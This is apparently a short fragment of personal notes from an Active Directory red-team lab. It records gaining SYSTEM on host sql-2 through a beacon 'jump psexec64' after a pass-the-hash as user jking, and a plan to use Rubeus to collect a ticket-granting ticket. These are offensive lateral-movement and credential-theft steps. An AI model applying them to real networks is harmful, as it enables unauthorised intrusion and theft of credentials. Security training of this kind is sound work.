...
```BASH
# can be used on any machine in the AD 
...
```bash
# to get onto sql-2 as system ran command from WKST 2 jump psexec64 sql-2.dev.cyberbotic.io smb
# i believe as long as im system can psexec from any machine tho.
# above comment was wrong, in order to be able to psexec into the sql machine must pass the hash as system to jking - reference pass the hash documentation to do so - once as jking can then execute jump command to psexec
# i believe that the reason is that jking is on the admin/rdp list.
beacon> run hostname
sql-2

beacon> getuid
[*] You are NT AUTHORITY\SYSTEM (admin)
#rubeus triage to grab sql tgt
